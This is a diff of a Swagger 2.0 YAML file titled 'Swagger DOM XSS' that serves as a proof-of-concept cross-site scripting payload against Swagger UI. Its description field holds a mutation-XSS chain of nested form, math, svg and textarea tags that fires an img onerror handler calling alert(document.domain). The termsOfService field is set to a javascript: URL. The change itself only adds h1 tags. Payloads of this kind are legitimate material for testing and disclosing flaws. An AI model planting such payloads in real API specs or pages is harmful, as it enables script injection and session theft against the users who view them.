@@ -1,7 +1,7 @@
 swagger: '2.0'
 info: 
   title: Swagger DOM XSS
-  description: <a href="https://sachin-v3rma.github.io"><img src="https://raw.githubusercontent.com/Sachin-v3rma/random/main/fake.svg">XSS|
+  description: <a href="https://sachin-v3rma.github.io"><img src="https://raw.githubusercontent.com/Sachin-v3rma/random/main/fake.svg"><h1>XSS</h1>|
     <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.domain) src=1>"></form>
 
   termsOfService: "javascript:prompt()"
